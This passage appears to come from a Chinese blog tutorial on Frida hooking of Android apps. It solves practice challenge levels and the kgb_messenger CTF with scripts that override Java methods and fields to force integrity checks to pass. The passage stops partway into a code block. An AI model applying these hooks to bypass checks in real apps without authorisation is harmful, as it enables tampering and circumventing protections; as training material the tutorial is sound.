class="line">23</span><br></pre></td><td class="code"><pre><span class="line">public class FridaActivity3 extends BaseFridaActivity &#123;</span><br><span class="line">    private static boolean static_bool_var &#x3D; false;</span><br><span class="line">    private boolean bool_var &#x3D; false;</span><br><span class="line">    private boolean same_name_bool_var &#x3D; false;</span><br><span class="line"></span><br><span class="line">    public String getNextCheckTitle() &#123;</span><br><span class="line">        return &quot;当前第3关&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private void same_name_bool_var() &#123;</span><br><span class="line">        Log.d(&quot;Frida&quot;, static_bool_var + &quot; &quot; + this.bool_var + &quot; &quot; + this.same_name_bool_var);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void onCheck() &#123;</span><br><span class="line">        if (!static_bool_var || !this.bool_var || !this.same_name_bool_var) &#123;</span><br><span class="line">            super.CheckFailed();</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br><span class="line">        CheckSuccess();</span><br><span class="line">        startActivity(new Intent(this, FridaActivity4.class));</span><br><span class="line">        finishActivity(0);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>关键还是让<code>if (!static_bool_var || !this.bool_var || !this.same_name_bool_var)</code>为false，则三个变量都要为true</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ch3</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    Java.perform(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"start"</span>)</span><br><span class="line">        <span class="keyword">var</span> FridaActivity3 = Java.use(<span class="string">"com.example.androiddemo.Activity.FridaActivity3"</span>)</span><br><span class="line">        FridaActivity3.static_bool_var.value = <span class="literal">true</span></span><br><span class="line">        </span><br><span class="line">        Java.choose(<span class="string">"com.example.androiddemo.Activity.FridaActivity3"</span>, &#123;</span><br><span class="line">            onMatch: <span class="function"><span class="keyword">function</span> (<span class="params">instance</span>) </span>&#123;</span><br><span class="line">                instance.bool_var.value = <span class="literal">true</span></span><br><span class="line">                instance._same_name_bool_var.value = <span class="literal">true</span></span><br><span class="line">            &#125;,</span><br><span class="line">            onComplete: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">"end"</span>)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里要注意类里有一个成员函数和成员变量都叫做<code>same_name_bool_var</code>，这种时候在成员变量前加一个<code>_</code>，修改值的形式为<code>xx.value = yy</code></p><h3 id="Frida-hook-内部类，枚举类的函数并hook，trace原型1"><a href="#Frida-hook-内部类，枚举类的函数并hook，trace原型1" class="headerlink" title="Frida hook : 内部类，枚举类的函数并hook，trace原型1"></a>Frida hook : 内部类，枚举类的函数并hook，trace原型1</h3><p>总结:</p><ul><li>对于内部类，通过<code>类名$内部类名</code>去use或者choose</li><li>对use得到的clazz应用反射，如<code>clazz.class.getDeclaredMethods()</code>可以得到类里面声明的所有方法，即可以枚举类里面的所有函数。</li></ul><p>接下来是第四关</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">public class FridaActivity4 extends BaseFridaActivity &#123;</span><br><span class="line">    public String getNextCheckTitle() &#123;</span><br><span class="line">        return &quot;当前第4关&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private static class InnerClasses &#123;</span><br><span class="line">        public static boolean check1() &#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public static boolean check2() &#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public static boolean check3() &#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public static boolean check4() &#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public static boolean check5() &#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public static boolean check6() &#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        private InnerClasses() &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void onCheck() &#123;</span><br><span class="line">        if (!InnerClasses.check1() || !InnerClasses.check2() || !InnerClasses.check3() || !InnerClasses.check4() || !InnerClasses.check5() || !InnerClasses.check6()) &#123;</span><br><span class="line">            super.CheckFailed();</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br><span class="line">        CheckSuccess();</span><br><span class="line">        startActivity(new Intent(this, FridaActivity5.class));</span><br><span class="line">        finishActivity(0);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这一关的关键是让<code>if (!InnerClasses.check1() || !InnerClasses.check2() || !InnerClasses.check3() || !InnerClasses.check4() || !InnerClasses.check5() || !InnerClasses.check6())</code>中的所有check全部返回true。</p><p>其实这里唯一的问题就是寻找内部类<code>InnerClasses</code>，对于内部类的hook，通过<code>类名$内部类名</code>去use。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ch4</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    Java.perform(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> InnerClasses = Java.use(<span class="string">"com.example.androiddemo.Activity.FridaActivity4$InnerClasses"</span>)</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"start"</span>)</span><br><span class="line">        InnerClasses.check1.implementation = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">        &#125;</span><br><span class="line">        InnerClasses.check2.implementation = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">        &#125;</span><br><span class="line">        InnerClasses.check3.implementation = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">        &#125;</span><br><span class="line">        InnerClasses.check4.implementation = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">        &#125;</span><br><span class="line">        InnerClasses.check5.implementation = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">        &#125;</span><br><span class="line">        InnerClasses.check6.implementation = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>利用反射，获取类中的所有method声明，然后字符串拼接去获取到方法名，例如下面的check1，然后就可以批量hook，而不用像我上面那样一个一个写。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> inner_classes = Java.use(<span class="string">"com.example.androiddemo.Activity.FridaActivity4$InnerClasses"</span>)</span><br><span class="line"><span class="keyword">var</span> all_methods = inner_classes.class.getDeclaredMethods();</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">public <span class="keyword">static</span> boolean com.example.androiddemo.Activity.FridaActivity4$InnerClasses.check1(),public <span class="keyword">static</span> boolean com.example.androiddemo.Activity.FridaActivity4$InnerClasses.check2(),public <span class="keyword">static</span> boolean com.example.androiddemo.Activity.FridaActivity4$InnerClasses.check3(),public <span class="keyword">static</span> boolean com.example.androiddemo.Activity.FridaActivity4$InnerClasses.check4(),public <span class="keyword">static</span> boolean com.example.androiddemo.Activity.FridaActivity4$InnerClasses.check5(),public <span class="keyword">static</span> boolean com.example.androiddemo.Activity.FridaActivity4$InnerClasses.check6()</span><br></pre></td></tr></table></figure><h3 id="Frida-hook-hook动态加载的dex，与查找interface，"><a href="#Frida-hook-hook动态加载的dex，与查找interface，" class="headerlink" title="Frida hook : hook动态加载的dex，与查找interface，"></a>Frida hook : hook动态加载的dex，与查找interface，</h3><p>总结:</p><ul><li>通过<code>enumerateClassLoaders</code>来枚举加载进内存的classloader，再<code>loader.findClass(xxx)</code>寻找是否包括我们想要的interface的实现类，最后通过<code>Java.classFactory.loader = loader</code>来切换classloader，从而加载该实现类。</li></ul><p>第五关比较有趣，它的check函数是动态加载进来的。<br>java里有interface的概念，是指一系列抽象的接口，需要类来实现。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.androiddemo.Dynamic;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">CheckInterface</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">boolean</span> <span class="title">check</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DynamicCheck</span> <span class="keyword">implements</span> <span class="title">CheckInterface</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">check</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FridaActivity5</span> <span class="keyword">extends</span> <span class="title">BaseFridaActivity</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> CheckInterface DynamicDexCheck = <span class="keyword">null</span>;</span><br><span class="line">    ...</span><br><span class="line">    <span class="function"><span class="keyword">public</span> CheckInterface <span class="title">getDynamicDexCheck</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.DynamicDexCheck == <span class="keyword">null</span>) &#123;</span><br><span class="line">            loaddex();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.DynamicDexCheck;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* access modifiers changed from: protected */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle bundle)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(bundle);</span><br><span class="line">        loaddex();</span><br><span class="line">        <span class="comment">//this.DynamicDexCheck = (CheckInterface) new DexClassLoader(str, filesDir.getAbsolutePath(), (String) null, getClassLoader()).loadClass("com.example.androiddemo.Dynamic.DynamicCheck").newInstance();</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onCheck</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (getDynamicDexCheck() == <span class="keyword">null</span>) &#123;</span><br><span class="line">            Toast.makeText(<span class="keyword">this</span>, <span class="string">"onClick loaddex Failed!"</span>, <span class="number">1</span>).show();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (getDynamicDexCheck().check()) &#123;</span><br><span class="line">            CheckSuccess();</span><br><span class="line">            startActivity(<span class="keyword">new</span> Intent(<span class="keyword">this</span>, FridaActivity6<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line">            finishActivity(<span class="number">0</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">super</span>.CheckFailed();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里有个loaddex其实就是先从资源文件加载classloader到内存里，再loadClass DynamicCheck，创建出一个实例，最终调用这个实例的check。<br>所以现在我们就要先枚举class loader，找到能实例化我们要的class的那个class loader，然后把它设置成Java的默认class factory的loader。<br>现在就可以用这个class loader来使用<code>.use</code>去import一个给定的类。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ch5</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    Java.perform(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// Java.choose("com.example.androiddemo.Activity.FridaActivity5",&#123;</span></span><br><span class="line">        <span class="comment">//     onMatch:function(x)&#123;</span></span><br><span class="line">        <span class="comment">//         console.log(x.getDynamicDexCheck().$className)</span></span><br><span class="line">        <span class="comment">//     &#125;,onComplete:function()&#123;&#125;</span></span><br><span class="line">        <span class="comment">// &#125;)</span></span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"start"</span>)</span><br><span class="line">        Java.enumerateClassLoaders(&#123;</span><br><span class="line">            onMatch: <span class="function"><span class="keyword">function</span> (<span class="params">loader</span>) </span>&#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span>(loader.findClass(<span class="string">"com.example.androiddemo.Dynamic.DynamicCheck"</span>))&#123;</span><br><span class="line">                        <span class="built_in">console</span>.log(<span class="string">"Successfully found loader"</span>)</span><br><span class="line">                        <span class="built_in">console</span>.log(loader);</span><br><span class="line">                        Java.classFactory.loader = loader ;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">catch</span>(error)&#123;</span><br><span class="line">                    <span class="built_in">console</span>.log(<span class="string">"find error:"</span> + error)</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            onComplete: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">"end1"</span>)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">        Java.use(<span class="string">"com.example.androiddemo.Dynamic.DynamicCheck"</span>).check.implementation = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"end2"</span>)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line">setImmediate(ch5)</span><br></pre></td></tr></table></figure><p>todo有一个疑问<br><a href="https://github.com/frida/frida/issues/1049" target="_blank" rel="noopener">https://github.com/frida/frida/issues/1049</a></p><h3 id="Frida-hook-枚举class，trace原型2"><a href="#Frida-hook-枚举class，trace原型2" class="headerlink" title="Frida hook : 枚举class，trace原型2"></a>Frida hook : 枚举class，trace原型2</h3><p>总结: 通过<code>Java.enumerateLoadedClasses</code>来枚举类，然后<code>name.indexOf(str)</code>过滤一下并hook。</p><p>接下来是第六关</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.example.androiddemo.Activity.Frida6.Frida6Class0;</span><br><span class="line"><span class="keyword">import</span> com.example.androiddemo.Activity.Frida6.Frida6Class1;</span><br><span class="line"><span class="keyword">import</span> com.example.androiddemo.Activity.Frida6.Frida6Class2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FridaActivity6</span> <span class="keyword">extends</span> <span class="title">BaseFridaActivity</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getNextCheckTitle</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"当前第6关"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onCheck</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!Frida6Class0.check() || !Frida6Class1.check() || !Frida6Class2.check()) &#123;</span><br><span class="line">            <span class="keyword">super</span>.CheckFailed();</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        CheckSuccess();</span><br><span class="line">        startActivity(<span class="keyword">new</span> Intent(<span class="keyword">this</span>, FridaActivity7<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line">        finishActivity(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这关是import了一些类，然后调用类里的静态方法，所以我们枚举所有的类，然后过滤一下，并把过滤出来的结果hook上，改掉其返回值。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ch6</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    Java.perform(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        Java.enumerateLoadedClasses(&#123;</span><br><span class="line">            onMatch: <span class="function"><span class="keyword">function</span> (<span class="params">name, handle</span>)</span>&#123;</span><br><span class="line">                <span class="keyword">if</span> (name.indexOf(<span class="string">"com.example.androiddemo.Activity.Frida6"</span>) != <span class="number">-1</span>) &#123;</span><br><span class="line">                    <span class="built_in">console</span>.log(<span class="string">"name:"</span> + name + <span class="string">" handle:"</span> + handle)</span><br><span class="line">                    Java.use(name).check.implementation = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            onComplete: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">"end"</span>)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Frida-hook-搜索interface的具体实现类"><a href="#Frida-hook-搜索interface的具体实现类" class="headerlink" title="Frida hook : 搜索interface的具体实现类"></a>Frida hook : 搜索interface的具体实现类</h3><p>利用反射得到类里面实现的interface数组，并打印出来。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">more</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    Java.perform(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        Java.enumerateLoadedClasses(&#123;</span><br><span class="line">            onMatch: <span class="function"><span class="keyword">function</span> (<span class="params">class_name</span>)</span>&#123;</span><br><span class="line">                <span class="keyword">if</span> (class_name.indexOf(<span class="string">"com.example.androiddemo"</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">return</span></span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">var</span> hook_cls = Java.use(class_name)</span><br><span class="line">                    <span class="keyword">var</span> interfaces = hook_cls.class.getInterfaces()</span><br><span class="line">                    <span class="keyword">if</span> (interfaces.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                        <span class="built_in">console</span>.log(class_name + <span class="string">": "</span>)</span><br><span class="line">                        <span class="keyword">for</span> (<span class="keyword">var</span> i <span class="keyword">in</span> interfaces) &#123;</span><br><span class="line">                            <span class="built_in">console</span>.log(<span class="string">"\t"</span>, interfaces[i].toString())</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            onComplete: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">"end"</span>)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Frida-hook基础（二"><a href="#Frida-hook基础（二" class="headerlink" title="Frida hook基础（二)"></a>Frida hook基础（二)</h2><ul><li>spawn/attach</li><li>各种主动调用</li><li>hook函数和hook构造函数</li><li>调用栈/简单脚本</li><li>动态加载自己的dex</li></ul><p>题目下载地址:<br><a href="https://github.com/tlamb96/kgb_messenger" target="_blank" rel="noopener">https://github.com/tlamb96/kgb_messenger</a></p><h3 id="spawn-attach"><a href="#spawn-attach" class="headerlink" title="spawn/attach"></a>spawn/attach</h3><p>firda的-f参数代表span启动<br><code>frida -U -f com.tlamb96.spetsnazmessenger -l frida_russian.js --no-pause</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">    <span class="comment">/* access modifiers changed from: protected */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle bundle)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(bundle);</span><br><span class="line">        setContentView((<span class="keyword">int</span>) R.layout.activity_main);</span><br><span class="line">        String property = System.getProperty(<span class="string">"user.home"</span>);</span><br><span class="line">        String str = System.getenv(<span class="string">"USER"</span>);</span><br><span class="line">        <span class="keyword">if</span> (property == <span class="keyword">null</span> || property.isEmpty() || !property.equals(<span class="string">"Russia"</span>)) &#123;</span><br><span class="line">            a(<span class="string">"Integrity Error"</span>, <span class="string">"This app can only run on Russian devices."</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (str == <span class="keyword">null</span> || str.isEmpty() || !str.equals(getResources().getString(R.string.User))) &#123;</span><br><span class="line">            a(<span class="string">"Integrity Error"</span>, <span class="string">"Must be on the user whitelist."</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            a.a(<span class="keyword">this</span>);</span><br><span class="line">            startActivity(<span class="keyword">new</span> Intent(<span class="keyword">this</span>, LoginActivity<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个题目比较简单，但是因为这个check是在<code>onCreate</code>里，所以app刚启动就自动检查，所以这里需要用spawn的方式去启动frida脚本hook，而不是attach。<br>这里有两个检查，一个是检查property的值，一个是检查str的值。<br>分别从<code>System.getProperty</code>和<code>System.getenv</code>里获取，hook住这两个函数就行。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-06-29-092212.png" alt=""><br>这里要注意从资源文件里找到<code>User</code>的值。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    Java.perform(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        Java.use(<span class="string">"java.lang.System"</span>).getProperty.overload(<span class="string">'java.lang.String'</span>).implementation = <span class="function"><span class="keyword">function</span> (<span class="params">str</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"Russia"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        Java.use(<span class="string">"java.lang.System"</span>).getenv.overload(<span class="string">'java.lang.String'</span>).implementation = <span class="function"><span class="keyword">function</span>(<span class="params">str</span>)</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"RkxBR3s1N0VSTDFOR180UkNIM1J9Cg=="</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line">setImmediate(main)</span><br></pre></td></tr></table></figure><p>接下来进入到login功能</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 